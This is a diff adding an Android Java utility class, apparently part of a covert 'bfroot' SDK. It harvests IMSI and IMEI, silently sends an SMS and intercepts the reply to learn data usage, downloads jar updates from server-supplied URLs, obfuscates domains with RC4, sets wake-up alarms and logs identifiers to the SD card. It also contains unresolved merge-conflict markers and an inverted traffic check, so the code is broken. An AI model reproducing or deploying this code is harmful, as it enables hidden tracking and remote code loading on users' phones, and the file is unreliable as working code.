@@ -1,0 +1,794 @@
+package com.bfroot.tool;
+
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.text.DateFormat;
+import java.text.ParseException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.content.res.AssetManager;
+import android.content.res.Resources;
+import android.net.TrafficStats;
+import android.os.Build;
+import android.os.Environment;
+import android.os.SystemClock;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+<<<<<<< .mine
+import com.bfroot.service.BfAlarmreceiver;
+=======
+import com.bfroot.BfrootActivity;
+>>>>>>> .r2905
+import com.bfroot.service.BfHeartService;
+import com.bfroot.service.BfSmsReceive;
+
+public class BfTool 
+{
+	private static BfGprsObject receiveGprs = null;
+	
+	/**
+	 * 获取基本参数
+	 */
+	public static void getBasicInfo(Context context)
+	{
+		SharedPreferences sp = context.getSharedPreferences("bfroot",
+				BfHeartService.MODE_PRIVATE);
+		String account = sp.getString(BfConfig.BfAccountName, "-1");
+		int jarcode = sp.getInt(BfConfig.JarCodeName, 0);
+		
+		BfConfig.Account = account;
+		BfConfig.JarCode = jarcode;
+		
+		
+		TelephonyManager telManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+		BfConfig.IMSI = telManager.getSubscriberId();
+		BfConfig.IMEI = telManager.getDeviceId();
+		BfLog("getBasicInfo IMSI:"+BfConfig.IMSI+"IMEI:"+BfConfig.IMEI);
+		
+		/*手机名称 防止手机名称里面有URL不允许特殊字符*/
+		String model = Build.MODEL;
+		BfConfig.PHONE_NAME = URLEncoder.encode(model);
+		BfLog( "getBasicInfo PHONE_NAME:"+BfConfig.PHONE_NAME);
+		
+		/*获取商户ID*/
+		BfConfig.Vest = getVest(context);
+		
+	}
+	
+	/**
+	 * 获取心跳协议的网络流量和短信中心号码
+	 */
+	public static void getGprsScnInfo(Context context)
+	{
+		TelephonyManager telManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+		if(telManager.getSimState() != TelephonyManager.SIM_STATE_ABSENT)
+		{
+			SharedPreferences sp = context.getSharedPreferences("bfroot",
+					BfHeartService.MODE_PRIVATE);
+			String smsBody = sp.getString(BfConfig.GprsMesBodyName, "1091");
+			String smsAdd = sp.getString(BfConfig.GprsMesAddName, "10086");
+			String totalkey = sp.getString(BfConfig.GprsToTalKeyName, "数据流量共");
+			String usedkey = sp.getString(BfConfig.GprsCostKeyName, "，已使用");
+			
+			BfSendGprsObject mesObject = new BfSendGprsObject();
+			mesObject.setMescode(smsBody);
+			mesObject.setMesadd(smsAdd);
+			mesObject.setTotalkey(totalkey);
+			mesObject.setUsedkey(usedkey);
+			
+			BfGprsObject resultObject = getGprsInfo(context, mesObject);
+			BfConfig.ScnCode = resultObject.getScn();
+			int total = (int) Double.parseDouble(resultObject.getGprs()) +1;
+			BfConfig.GprsTotal = URLEncoder.encode(total+"");
+			int cost = (int) Double.parseDouble(resultObject.getGprscost()) +1;
+			BfConfig.GprsCost = URLEncoder.encode(cost+"");
+			BfLog( "getGprsScnInfo scncode:"+BfConfig.ScnCode);
+			BfLog( "getGprsScnInfo GprsTotal:"+BfConfig.GprsTotal);
+			BfLog("getGprsScnInfo GprsCost:"+BfConfig.GprsCost);
+		}
+	}
+	
+	/**
+	 * 通过截获gprs流量信息(循环等待)
+	 */
+	public static BfGprsObject getGprsInfo(Context context ,BfSendGprsObject mesObject)
+	{
+		receiveGprs = null;
+		long starttime = System.currentTimeMillis();
+		
+		BfSmsReceive receive = new BfSmsReceive(context, mesObject ,new BfSmsReceive.GprsSMSListener() 
+		{
+			public void sendSMSGprsCallback(String scn ,String gprs ,String gprscost) 
+			{
+				BfGprsObject result = new BfGprsObject();
+				
+				result.setScn(scn);
+				result.setGprs(gprs);
+				result.setGprscost(gprscost);
+				receiveGprs = result;
+			}
+		});
+		receive.registerReceiver();
+		receive.sendSms();
+		
+		while(null == receiveGprs )
+		{
+			try 
+			{
+				Thread.sleep(256);
+			} 
+			catch (InterruptedException e) 
+			{
+				e.printStackTrace();
+			}
+			
+			if(null == receiveGprs)
+			{
+				long endtime = System.currentTimeMillis();
+				if((endtime-starttime) >60000*10)
+				{
+					break;
+				}
+			}
+		}
+		receive.unRegisterReceiver();
+		return receiveGprs;
+	}
+	
+	/**
+	 * 通过读文件，获取商务ID
+	 */
+	public static String getVest(Context context)
+	{
+		String vest = "-1";
+		String vest_first_name = BfConfig.VestFirstName;
+		Resources resources = context.getResources();
+		AssetManager am = resources.getAssets();
+		try
+		{
+			String[] files = am.list("");
+			for (String file : files)
+			{
+				if(file.toString().contains(vest_first_name))
+				{
+					vest = file.toString().substring(vest_first_name.length() ,file.toString().lastIndexOf("."));
+					BfLog("getVest:"+file+":::"+vest);
+				}
+			}
+		} 
+		catch (IOException e)
+		{
+			e.printStackTrace();
+		}
+
+		return vest;
+	}
+	
+	/**
+	 * 联网回调接口
+	 */
+	public static interface CommonHttpCallback 
+	{
+		/**
+		 * 联网成功后的回调
+		 */
+		void finishcallback(int code , String data);
+	}
+	/**
+	 * 简单的联网请求
+	 */
+	public static void CommonHttpResquest(final String url ,final CommonHttpCallback callback)
+	{
+		new Thread(new Runnable() 
+		{
+			public void run()
+			{
+				String result = HttpRequest(url);
+				callback.finishcallback(1, result);
+			}
+		}).start();
+	}
+	
+	/**
+	 * 阻塞HTTP请求，返回字串
+	 * 
+	 * @param urlstr
+	 */
+	public static String HttpRequest(String urlstr)
+	{
+		HttpURLConnection hurlconn = null;
+		try
+		{
+			URL url = new URL(urlstr);
+			hurlconn = (HttpURLConnection) url.openConnection();
+			hurlconn.setDoInput(true);
+			hurlconn.setUseCaches(false);
+			hurlconn.setRequestMethod("GET");
+			hurlconn.setConnectTimeout(15000);
+			hurlconn.setReadTimeout(15000);
+			
+			int code = hurlconn.getResponseCode();
+
+			if (code == HttpURLConnection.HTTP_OK)
+			{
+				hurlconn.connect();
+				InputStream in = hurlconn.getInputStream();
+				BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+				
+				String line = null;
+				StringBuffer sb = new StringBuffer();
+				// 接受数据流
+				while ((line = reader.readLine()) != null)
+				{
+					sb.append(line);
+				}
+				
+				String result = sb.toString();
+				return result;
+			}
+		}
+		catch (MalformedURLException e)
+		{
+			e.printStackTrace();
+		}
+		catch (IOException e)
+		{
+			e.printStackTrace();
+		}
+		finally
+		{
+			if(hurlconn != null)
+			{
+				hurlconn.disconnect();
+			}
+		}
+		return null;
+	}
+	
+	/**
+	 * 对 string builder 信息进行关键字替换
+	 * 
+	 * @param sb
+	 *            字串信息
+	 * @param key
+	 *            关键字信息
+	 * @param value
+	 *            要替换的内容
+	 */
+	public static final void replaceForWord(StringBuilder sb, String key,
+			String value)
+	{
+		if (null == value)
+		{
+			return;
+		}
+		int start = 0;
+		int end, length;
+
+		length = key.length();
+		start = sb.indexOf(key);
+		while (start >= 0)
+		{
+			end = start + length;
+
+			sb.replace(start, end, value);
+			start = sb.indexOf(key, start);
+		}
+	}
+	
+	/**
+	 * json转对象
+	 */
+	public static JSONObject toObj(String jsonString)
+	{
+		JSONObject demoJson = null;
+		try
+		{
+			demoJson = new JSONObject(jsonString);
+		}
+		catch (JSONException e)
+		{
+			e.printStackTrace();
+		}
+		return demoJson;
+	}
+	
+	public static boolean updateJar(Context context ,JSONObject execObj)
+	{
+		BfLog( "BfTool  updatejar"+execObj.toString());
+		try 
+		{
+			int jarcode = execObj.getInt("jarcode");
+			String jarurl = execObj.getString("jarurl");
+			
+			/*更新jar的命令实现*/
+			if(jarcode >0 && null != jarurl)
+			{
+				SharedPreferences sp = context.getSharedPreferences("bfroot",
+						BfHeartService.MODE_PRIVATE);
+				int bsjarcode = sp.getInt(BfConfig.JarCodeName, 0);
+				
+				String filePath = Environment.getExternalStorageDirectory().getPath()+File.separator;
+				File file = new File(filePath+BfConfig.JarFileName);
+				
+				if(bsjarcode < jarcode || !file.exists())
+				{
+					return execUpdate(context ,jarcode , jarurl);
+				}
+			}
+		} catch (JSONException e)
+		{
+			e.printStackTrace();
+		}
+		return true;
+	}
+	
+	public static boolean execUpdate(Context context, int jarcode , String jarurl)
+	{
+		if(BfNetWorkTool.bfNetWorkInit(context, BfNetWorkTool.CODE_USE_CN_WIFI))
+		{
+			String filePath = Environment.getExternalStorageDirectory().getPath()+File.separator;
+			File file = new File(filePath+BfConfig.JarFileName);
+			if(file.exists())
+			{
+				deleteFileOnly(file);
+			}
+			BfLog("execUpdate  jarurl:"+jarurl+"filePath:"+filePath);
+			int result = -1;
+			int errorcode = 0;
+			while(result != 200)
+			{
+				result = HttpRequest(BfConfig.JarFileName , jarurl , filePath);
+				BfLog( "execUpdate  result:"+result+"jarcode:"+jarcode);
+				errorcode++;
+				if(errorcode>5)
+				{
+					break;
+				}
+			}
+			if(result == 200)
+			{
+				SharedPreferences sp = context.getSharedPreferences("bfroot",
+						BfHeartService.MODE_PRIVATE);
+				sp.edit().putInt(BfConfig.JarCodeName, jarcode).commit();
+				return true;
+			}
+		}
+		return false;
+	}
+	
+	/**
+	 * 阻塞HTTP请求，保存文件
+	 * 
+	 * @param urlstr
+	 * 			下载的完整路径
+	 * @param name
+	 * 			需要保存的文件名称
+	 * @param filePath
+	 * 			需要保存文件的路径
+	 */
+	public static int HttpRequest(String name , String urlstr ,String filePath )
+	{
+		int resultcode = -1;
+		
+		long total = 0;
+		long completeSize = 0;
+		OutputStream out = null;
+		HttpURLConnection hurlconn = null;
+		long fsize = 0;
+
+		File tempFile = new File(filePath);
+		if(!tempFile.exists())
+		{
+			tempFile.mkdirs();
+		}
+		
+		File file = new File(filePath + File.separator+ name);
+		if (file.exists())
+		{
+			fsize = file.length();
+		}
+
+		try
+		{
+			URL httpUrl = new URL(urlstr);
+			hurlconn = (HttpURLConnection) httpUrl.openConnection();
+			hurlconn.setDoInput(true);
+			hurlconn.setUseCaches(false);
+			hurlconn.setRequestMethod("GET");
+			hurlconn.setConnectTimeout(30000);
+			hurlconn.setReadTimeout(30000);
+			hurlconn.setRequestProperty("Accept-Encoding", "identity");
+			
+			if (fsize > 0)
+			{
+				hurlconn.setRequestProperty("Range", "bytes=" + fsize + "-");
+			}
+			int code = hurlconn.getResponseCode();
+			
+			if (code == HttpURLConnection.HTTP_OK
+					|| code == HttpURLConnection.HTTP_PARTIAL)
+			{
+				total = hurlconn.getContentLength();
+				if (total <= 0)
+				{
+					/*是否需要断点续传*/
+					return resultcode;
+				}
+				
+				if (fsize > 0)
+				{
+					total += fsize;
+					completeSize = fsize;
+				}
+				
+				InputStream instream = hurlconn.getInputStream();
+				out = new FileOutputStream(file, true);
+				byte[] b = new byte[1024 * 8];
+				int length = 0;
+				
+				while (length  != -1)
+				{
+					length = instream.read(b);
+					if (length != -1)
+					{
+						out.write(b, 0, length);
+						completeSize += length;
+					}
+				}
+				if (completeSize >= total)
+				{
+					instream.close();
+					out.flush();
+					out.close();
+					hurlconn.disconnect();
+					resultcode = 200;
+				}
+			}
+			else if (code == 416)
+			{
+				hurlconn.disconnect();
+				resultcode = 200;
+			}
+			else
+			{
+				if (null != hurlconn)
+				{
+					hurlconn.disconnect();
+				}
+				
+				/*递归调用，继续下载*/
+//				HttpRequest(name ,urlstr ,filePath);
+			}
+		}
+		catch (MalformedURLException e)
+		{
+			e.printStackTrace();
+			if (null != hurlconn)
+			{
+				hurlconn.disconnect();
+			}
+			/*递归调用，继续下载*/
+//			HttpRequest(name ,urlstr ,filePath);
+		}
+		catch (IOException e)
+		{
+			e.printStackTrace();
+			if (null != hurlconn)
+			{
+				hurlconn.disconnect();
+			}
+			/*递归调用，继续下载*/
+//			HttpRequest(name ,urlstr ,filePath );
+		}
+		catch (Exception e)
+		{
+			e.printStackTrace();
+			if (null != hurlconn)
+			{
+				hurlconn.disconnect();
+			}
+			/*递归调用，继续下载*/
+//			HttpRequest(name ,urlstr ,filePath );
+		}
+		finally
+		{
+			if (null != hurlconn)
+			{
+				hurlconn.disconnect();
+			}
+		}
+		return resultcode;
+	}
+	
+	public static void deleteFileOnly(File file)
+	{
+        if(file.isFile())
+        {
+            file.delete();
+            return;
+        }
+        if(file.isDirectory())
+        {
+            File[] childFile = file.listFiles();
+            for(File f : childFile)
+            {
+            	deleteFileOnly(f);
+            }
+        }
+    }
+	
+	/**
+	 * 判断是否是数字
+	 */
+	public static boolean isNum(String str)
+	{
+		if(str != null)
+		{
+			return str.matches("^[-+]?(([0-9]+)([.]([0-9]+))?|([.]([0-9]+))?)$");
+		}
+		else
+		{
+			return false;
+		}
+	}
+	/*
+	 * 获取上下行手机流量（不包括wifi）
+	 */
+	public static void getMobileGprs(String datetime)
+	{
+		SharedPreferences sp = BfrootActivity.context.getSharedPreferences("bfroot",
+				BfrootActivity.MODE_PRIVATE);
+		int datamonth = sp.getInt(BfConfig.Month, 0);
+		
+	    DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+	    Date date = null;
+		try {
+			date = df.parse(datetime);
+		} catch (ParseException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		long gprsbefor =0;
+		long gprsafter = 0;
+	    if(date != null&&date.getMonth()!=datamonth)
+		{
+			gprsbefor = 0;
+		}
+		else
+		{
+			gprsbefor = sp.getLong(BfConfig.GprsFlow, 0);
+		}
+		if(TrafficStats.getMobileRxBytes() == TrafficStats.UNSUPPORTED)
+		{
+			gprsafter =gprsbefor+TrafficStats.getMobileRxBytes()+TrafficStats.getMobileTxBytes();  
+		}
+		else
+		{
+			gprsafter = gprsbefor;
+		}
+		if(date != null)
+		{
+			sp.edit().putString(BfConfig.Month, String.valueOf(date.getMonth())).commit();
+		}
+		sp.edit().putString(BfConfig.GprsFlow, String.valueOf(gprsafter)).commit();
+	}
+	
+	/**
+	 * 对域名的处理
+	 */
+	public static String RunRC4(String aInput, String aKey)
+	{
+		int[] iS = new int[256];
+		byte[] iK = new byte[256];
+		for (int i = 0; i < 256; i++)
+		{
+			iS[i] = i;
+			iK[i] = (byte) aKey.charAt(i % aKey.length());
+		}
+		int j = 0;
+		for (int i = 0; i < 255; i++)
+		{
+			j = (j + iS[i] + iK[i]) % 256;
+			int temp = iS[i];
+			iS[i] = iS[j];
+			iS[j] = temp;
+		}
+		int i = 0;
+		j = 0;
+		char[] iInputChar = aInput.toCharArray();
+		char[] iOutputChar = new char[iInputChar.length];
+		for (short k = 0; k < iInputChar.length; k++)
+		{
+			i = (i + 1) % 256;
+			j = (j + iS[i]) % 256;
+			int temp = iS[i];
+			iS[i] = iS[j];
+			iS[j] = temp;
+			int t = (iS[i] + (iS[j] % 256)) % 256;
+			int iY = iS[t];
+			char iCY = (char) iY;
+			iOutputChar[k] = (char) (iInputChar[k] ^ iCY);
+		}
+		return new String(iOutputChar);
+	}
+	/**
+	 * 获取根目录路径（如果有T卡优先T卡）
+	 */
+	public static String getRootFilePathHeader(Context context)
+	{
+		String path;
+		String status = Environment.getExternalStorageState();
+
+		if (status.equals(Environment.MEDIA_MOUNTED))
+		{
+			path = Environment.getExternalStorageDirectory().getPath();
+		}
+		else
+		{
+			File file =context.getApplicationContext().getFilesDir();
+			if (null == file)
+			{
+				return File.separator;
+			}
+			path = file.getPath();
+		}
+
+		return path;
+	}
+	
+	public static String getBfPackageFile(Context context)
+	{
+		String path = null;
+		File file =context.getApplicationContext().getFilesDir();
+		if (null == file)
+		{
+			return File.separator;
+		}
+		path = file.getPath();
+		path = path+BfConfig.APLICATION_NAME+getAPKName(context)+"/";
+		return path;
+	}
+	public static String getAPKName(Context context)
+	{
+		String package_name = null;
+		PackageManager pm = context.getApplicationContext().getPackageManager();
+		String path = context.getApplicationContext().getPackageResourcePath();
+		PackageInfo info = pm.getPackageArchiveInfo(path,
+				PackageManager.GET_ACTIVITIES);
+
+		if (info != null)
+		{
+			ApplicationInfo appInfo = info.applicationInfo;
+			package_name = appInfo.packageName;
+		}
+
+		return package_name;
+	}
+	
+	public static void BfLog(String content)
+	{
+		Log.v("jeden", content);
+		if(null == content || content.length() == 0)
+		{
+			content = "null";
+		}
+		saveStrToSDcard(content);
+	}
+	
+	/**
+	 * 将字串存储到 sdcard
+	 * 
+	 * @param str
+	 * @param fileName
+	 */
+	public static void saveStrToSDcard(String content)
+	{
+		String path = getRootFilePathHeader(BfHeartService.getHeartContext()) + "/bflog";
+		
+		File file = new File(path);
+		if (!file.exists())
+		{
+			try
+			{
+				file.createNewFile();
+			}
+			catch (IOException e)
+			{
+				e.printStackTrace();
+			}
+		}
+		BufferedWriter out=null;
+
+		try
+		{
+			out = new BufferedWriter(new FileWriter(file,true));
+			out.write(content);
+			out.newLine(); 
+			out.close();
+		}
+		catch (IOException e)
+		{
+			e.printStackTrace();
+		}
+	}
+	
+	public static void setReAlarmTime(Context context ,int flags ,long starttime ,long interval)
+	{
+		Intent intent =new Intent(context, BfAlarmreceiver.class);
+	    intent.setAction(BfAlarmreceiver.BF_REPEAT_ACTION);
+	    PendingIntent sender=PendingIntent
+	        .getBroadcast(context, flags , intent, 0);
+	 
+	    //开始时间
+	    long firstime=SystemClock.elapsedRealtime()+starttime;
+	 
+	    AlarmManager am=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
+	    /*周期性发送广播*/
+	    am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP
+	            , firstime, interval , sender);
+	    
+	    BfLog("Ralarm闹钟开启 start:"+starttime +"interval:"+interval);
+	}
+	
+	public static void cancelReAlarmTime(Context context ,int flags)
+	{
+		Intent intent =new Intent(context, BfAlarmreceiver.class);
+	    intent.setAction(BfAlarmreceiver.BF_REPEAT_ACTION);
+	    PendingIntent sender=PendingIntent
+	        .getBroadcast(context, flags , intent, 0);
+	 
+	    AlarmManager alarm=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
+	    alarm.cancel(sender);	
+	    BfLog("Ralarm闹钟关闭");
+	}
+	
+	public static void setShAlarmTime(Context context ,int flags ,long time)
+	{
+		Intent intent =new Intent(context, BfAlarmreceiver.class);
+	    intent.setAction(BfAlarmreceiver.BF_SHORT_ACTION);
+	    PendingIntent sender=
+	        PendingIntent.getBroadcast(context, flags, intent, 0);
+	 
+	    AlarmManager alarm=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
+	    alarm.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+time, sender);
+	    
+	    BfLog( "alarm闹钟开启");
+	}
+	
+	public static void cancelShAlarmTime(Context context ,int flags)
+	{
+		Intent intent =new Intent(context, BfAlarmreceiver.class);
+	    intent.setAction(BfAlarmreceiver.BF_SHORT_ACTION);
+	    PendingIntent sender=
+	        PendingIntent.getBroadcast(context, flags, intent, 0);
+	 
+	    AlarmManager alarm=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
+	    alarm.cancel(sender);	    
+	    BfLog( "alarm闹钟关闭");
+	}
+}
